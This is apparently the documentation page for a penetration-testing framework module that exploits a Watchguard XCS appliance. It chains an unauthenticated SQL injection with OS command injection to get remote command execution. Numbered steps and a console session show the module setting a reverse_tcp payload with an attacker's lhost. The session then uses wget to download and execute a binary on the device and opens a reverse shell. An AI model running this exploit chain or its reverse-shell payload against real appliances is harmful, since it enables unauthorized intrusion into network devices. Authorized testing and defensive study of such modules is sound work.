## Description

This module exploits two separate vulnerabilities found in the Watchguard XCS virtual appliance to gain command execution. By exploiting an unauthenticated SQL injection, a remote attacker may insert a valid web user into the appliance database, and get access to the web interface. On the other hand, a vulnerability in the web interface allows the attacker to inject operating system commands as the "nobody" user.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use exploits/misc/watchguard/xcs_9_rce`
  3. Do: `set target[TargetIP]`
  4. Do: `run`
  5. If router is vulnerable, it should be possible to execute commands on operating system level.

  6. Do: `set payload reverse_tcp`
  7. Do: `set lhost [AttackerIP]`
  8. Do: `run`
  9. Payload is sent to device and executed providing attacker with the command shell.


## Scenarios

```
rsf > use exploits/misc/watchguard/xcs_9_rce
rsf (Watchguard XCS Remote Command Execution) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Watchguard XCS Remote Command Execution) > run
[*] Running module exploits/misc/watchguard/xcs_9_rce...
[*] Getting a valid session...

[+] Welcome to cmd. Commands are sent to the target via the execute method.
[*] For further exploitation use 'show payloads' and 'set payload <payload>' commands.

cmd > show payloads
[*] Available payloads:

   Payload         Name                  Description
   -------         ----                  -----------
   bind_tcp        x64 Bind TCP        Creates interactive tcp bind shell for x64 architecture.
   reverse_tcp     x64 Reverse TCP     Creates interactive tcp reverse shell for x64 architecture.

cmd > set payload reverse_tcp
cmd (x64 Reverse TCP) > show options

Payload Options:

   Name        Current settings     Description
   ----        ----------------     -----------
   lhost                            Connect-back IP address
   lport       5555                 Connect-back TCP Port
   encoder                          Encoder


cmd (x64 Reverse TCP) > set lhost 192.168.1.115
lhost => 192.168.1.115
cmd (x64 Reverse TCP) > run
[*] Using wget method
[*] Using wget to download binary
[*] Executing payload on the device
[*] Waiting for reverse shell...
[*] Connection from 192.168.1.1:56981
[+] Enjoy your shell
```
